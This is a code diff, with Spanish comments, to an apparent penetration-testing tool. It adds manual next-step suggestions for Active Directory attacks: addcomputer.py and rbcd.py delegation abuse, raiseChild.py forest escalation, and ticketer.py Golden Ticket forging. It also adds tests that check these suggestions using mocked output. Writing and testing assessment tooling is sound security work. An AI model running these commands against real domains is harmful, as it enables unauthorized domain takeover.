@@ -6172,6 +6172,16 @@ def _creds_enum(res, nxc, np, ip, u, secret, is_hash, local_auth, is_dc, port, d
                       note="MachineAccountQuota: ¿cuántas cuentas de equipo puede unir al dominio una cuenta cualquiera? (precondición de noPac/RBCD/Shadow Credentials)")
                 if maq_f:
                     _add_once(res, maq_f[0], maq_f[1], "MachineAccountQuota", seen)
+                    if maq_f[0] == "alta":
+                        ident = f"{domain}/{shlex.quote(u)}:{'' if is_hash else '***'}"
+                        res["next"].append(
+                            f"addcomputer.py -computer-name 'EVIL$' -computer-pass 'Passw0rd123!' "
+                            f"-dc-ip {ip} {ident}   # MachineAccountQuota>0 confirmado arriba: crea una "
+                            "cuenta de equipo propia (paso MANUAL, 1er paso de RBCD/noPac/Shadow Credentials)")
+                        res["next"].append(
+                            f"rbcd.py -delegate-to 'EQUIPO_OBJETIVO$' -delegate-from 'EVIL$' -action write "
+                            f"{ident} -dc-ip {ip}   # RBCD: con la cuenta de equipo de arriba ya creada, "
+                            "delega sobre EQUIPO_OBJETIVO para pedir un ticket a su nombre (paso MANUAL)")
                 # Trusts de dominio/bosque: con una credencial YA validada (bind simple sobre
                 # LDAP, no SASL) se lee donde el anónimo de fp_ldap casi nunca llega. nxc NO
                 # tiene un flag '--trusts' (confirmado leyendo su código fuente: el método que
@@ -6196,6 +6206,16 @@ def _creds_enum(res, nxc, np, ip, u, secret, is_hash, local_auth, is_dc, port, d
                         _add_once(res, "info",
                                   f"AD (cred {u}): trust con '{t['partner']}' — {t['direction']}, {t['type']}, alcance: {scope}",
                                   f"trust {t['partner']}", seen)
+                        # raiseChild.py: ataque child→parent del MISMO bosque — solo tiene sentido si
+                        # el dominio escaneado es HIJO del partner (nombre DNS subdominio del partner)
+                        # Y la credencial actual ya es Domain Admin EN ESE HIJO (palantir no lo
+                        # confirma solo, se deja como precondición explícita en el texto).
+                        if domain.lower().endswith("." + t["partner"].lower()):
+                            res["next"].append(
+                                f"raiseChild.py {domain}/{shlex.quote(u)}   # trust padre-hijo con "
+                                f"'{t['partner']}' (arriba): escala al bosque entero DESDE este dominio "
+                                "hijo — paso MANUAL, solo tiene sentido si esta credencial YA es Domain "
+                                "Admin en este dominio (no solo una cuenta estándar)")
             # get-desc-users: contraseñas filtradas en el campo "description" de las cuentas
             # (fallo de higiene clásico en AD). fp_ldap ya lo ejecuta, pero SOLO tras un bind
             # anónimo — si el anónimo está deshabilitado (lo normal en un AD mínimamente
@@ -6328,6 +6348,22 @@ def _creds_enum(res, nxc, np, ip, u, secret, is_hash, local_auth, is_dc, port, d
                     "AD CS: plantillas vulnerables (ESC1-8) — dominio aún no confirmado en este punto, sustituye DOMINIO")
             else:
                 res["missing"].append("certipy")
+            # ACLs de objetos de alto valor (dacledit -action read, impacket): SOLO LECTURA, no
+            # se parsea aquí (sería decodificar un SECURITY_DESCRIPTOR binario en Python puro,
+            # ver el comentario del DCSync-rights check justo abajo sobre por qué se evita) —
+            # se deja como sugerencia para que el operador lo mire a mano en los objetos de más
+            # valor (raíz del dominio, Domain Admins, krbtgt, AdminSDHolder): un GenericAll/
+            # WriteDACL/WriteOwner/GenericWrite ahí, en un trustee inesperado, es casi tan
+            # directo como un DCSync. Sintaxis confirmada en el código fuente de dacledit.py:
+            # 'read' es la acción por defecto, el objetivo va con -target/-target-dn.
+            if domain:
+                dom_dn = ",".join(f"DC={p}" for p in domain.split("."))
+                res["next"].append(
+                    f"dacledit.py -target 'Domain Admins' {domain}/{shlex.quote(u)}:{'' if is_hash else '***'} "
+                    f"-dc-ip {ip}   # ACL de 'Domain Admins' — repite cambiando -target por "
+                    f"'{dom_dn}' (raíz del dominio), 'krbtgt' y 'CN=AdminSDHolder,CN=System,{dom_dn}' — busca "
+                    "GenericAll/WriteDACL/WriteOwner/GenericWrite/AllExtendedRights en un trustee que no sea "
+                    "un grupo integrado (paso MANUAL, solo lectura)")
             # DCSync-rights check: ¿tiene esta cuenta los derechos de replicación
             # (DS-Replication-Get-Changes + -All) que hacen falta para un DCSync? En vez de
             # parsear el ACL del dominio (SECURITY_DESCRIPTOR binario, caro de decodificar en
@@ -6365,6 +6401,11 @@ def _creds_enum(res, nxc, np, ip, u, secret, is_hash, local_auth, is_dc, port, d
                     res["next"].append(
                         f"{secretsdump} {shown_hs}-just-dc {shown_target}   # DCSync confirmado arriba: "
                         "vuelca TODO NTDS (paso MANUAL, no se encadena solo — ver MEJORAS.md)")
+                    res["next"].append(
+                        f"ticketer.py -nthash {krbtgt_hash} -domain-sid DOMAIN_SID -domain {domain} "
+                        "baduser   # Golden Ticket con el hash de krbtgt confirmado arriba (paso MANUAL) — "
+                        "sustituye DOMAIN_SID por el SID del dominio (p. ej. de 'lookupsid.py "
+                        f"{shown_target}' o de la salida de nxc --users, que lo trae por usuario)")
             elif secretsdump and not domain:
                 res["next"].append(
                     f"{secretsdump} -just-dc-user krbtgt DOMINIO/{shlex.quote(u)}:*** @{ip}   # DCSync-rights "
@@ -9682,6 +9723,41 @@ def selftest():
     assert "Secret123" not in _cstep["cmd"] and "***" in _cstep["cmd"]   # …pero el comando GUARDADO/mostrado sí lo enmascara
     assert any(sev == "critica" and "ESC1" in t for sev, t in _cfind["findings"])
     assert any("certipy req" in n and "ESC1" in n for n in _cfind["next"])   # sugerencia MANUAL, nunca ejecutado
+
+    # Sugerencias nuevas de _creds_enum (LDAP) tras MAQ>0 / trust padre-hijo / DCSync: addcomputer.py+
+    # rbcd.py, raiseChild.py y ticketer.py — las tres SOLO como next-step (texto), nunca ejecutadas.
+    # dacledit.py (ACLs de objetos de alto valor) sale con solo tener dominio conocido, sin depender
+    # de ningún hallazgo concreto.
+    _real_sd_bin = globals()["_secretsdump_bin"]
+
+    def _fake_ldap_full_chain(cmd, timeout=None, quiet=False, **kw):
+        if cmd[0] == "FAKE_SECRETSDUMP":
+            return 0, "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::\n"
+        if cmd[0] == "ldapsearch":
+            return 0, ("dn: CN=child,CN=System,DC=child,DC=corp,DC=local\n"
+                       "trustPartner: corp.local\ntrustDirection: 3\ntrustType: 2\ntrustAttributes: 32\n\n")
+        if "-M" in cmd and "maq" in cmd:
+            return 0, "LDAP 10.0.0.1 389 DC01 [+] MachineAccountQuota: 10"
+        if any(m in cmd for m in _ENUM_MODS):
+            return 0, "LDAP 10.0.0.1 389 DC01 [+] (enum ok)"
+        return 0, "LDAP 10.0.0.1 389 DC01 [+] child\\wley:Password123"
+
+    globals()["nxc_bin"], globals()["run_capture"], globals()["certipy_bin"], globals()["_secretsdump_bin"], globals()["have"] = (
+        (lambda: "FAKE_NXC"), _fake_ldap_full_chain, (lambda: None), (lambda: "FAKE_SECRETSDUMP"),
+        (lambda t: t == "ldapsearch"))
+    try:
+        _chres = provided_creds_check("10.0.0.1", [{"port": 389, "name": "ldap"}, {"port": 88, "name": "kerberos-sec"}],
+                                      [("wley", "Password123")], domain="child.corp.local")
+    finally:
+        globals()["nxc_bin"], globals()["run_capture"], globals()["certipy_bin"], globals()["_secretsdump_bin"], globals()["have"] = (
+            _real_nxc_bin2, _real_run_capture, _real_certipy_bin, _real_sd_bin, have)
+    _chfind = next(r for r in _chres if r["proto"] == "reuse-ldap")
+    assert any("addcomputer.py" in n and "MachineAccountQuota" in n for n in _chfind["next"])
+    assert any("rbcd.py" in n and "-delegate-from 'EVIL$'" in n for n in _chfind["next"])
+    assert any("raiseChild.py" in n and "child.corp.local/wley" in n and "corp.local" in n for n in _chfind["next"])
+    assert any("dacledit.py" in n and "DC=child,DC=corp,DC=local" in n for n in _chfind["next"])
+    assert any("ticketer.py" in n and "16e26ba33e455a8c338142af8d89ffbc" in n and "DOMAIN_SID" in n for n in _chfind["next"])
+    assert all("Password123" not in n for n in _chfind["next"])   # el secreto nunca va en texto plano en un next-step
 
     # Sin dominio conocido todavía (domain=None, el caso normal: Fase 5d corre antes de
     # discover_domains()): certipy NO se ejecuta a ciegas con un dominio adivinado — se
